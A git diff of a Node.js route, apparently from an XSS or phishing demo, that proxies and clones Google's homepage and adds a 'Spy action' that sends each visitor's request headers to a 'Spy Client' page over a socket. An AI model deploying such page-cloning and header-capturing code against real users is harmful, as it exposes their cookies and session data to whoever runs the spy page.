@@ -1,6 +1,7 @@
 var jsdom   = require('jsdom')
   , request = require('request')
-  , url     = require('url');
+  , url     = require('url')
+  , app;
 
 // Navigation route
 exports.xss = function(req, res){
@@ -16,6 +17,12 @@ exports.xss = function(req, res){
     }
 
     // Resolve relative paths    
+    
+    /*body = body.replace(
+      RegExp('(?!(https|http):)\/\/', 'g'),
+      'http://google.ca/'
+    );*/
+
     body = body.replace(RegExp("\/images\/srpr\/nav_logo80.png","g"),
       "http://google.ca/images/srpr/nav_logo80.png");
     body = body.replace(RegExp("\/intl\/en_ALL\/images\/logos\/images_logo_lg.gif","g"),
@@ -25,7 +32,7 @@ exports.xss = function(req, res){
     body = body.replace(RegExp("\/images\/nav_logo_hp2.png","g"), "http://google.ca/images/nav_logo_hp2.png");
     body = body.replace(RegExp("/xjs/_/js/hp/sb_he,pcc/rt=j/ver=Q_cOygzMvpQ.en_US./d=1/sv=1/rs=AItRSTOgJyyZkvMii1rmCgNDNAM4bjLPiA","g"),
       "http://google.ca/xjs/_/js/hp/sb_he,pcc/rt=j/ver=Q_cOygzMvpQ.en_US./d=1/sv=1/rs=AItRSTOgJyyZkvMii1rmCgNDNAM4bjLPiA");
-        
+
     // Parses head markup
     var head = body.split("<head>", 2);
     head = head[1].split("</head>", 2);
@@ -42,6 +49,12 @@ exports.xss = function(req, res){
     });
 
   });
+
+  // Spy action
+
+  exports.socket && exports.socket.emit('data', {
+    headers: req.headers
+  });
 };
 
 exports.spy = function(req, res){
@@ -51,3 +64,5 @@ exports.spy = function(req, res){
     title: 'Spy Client'
   });
 };
+
+exports.socket = undefined;
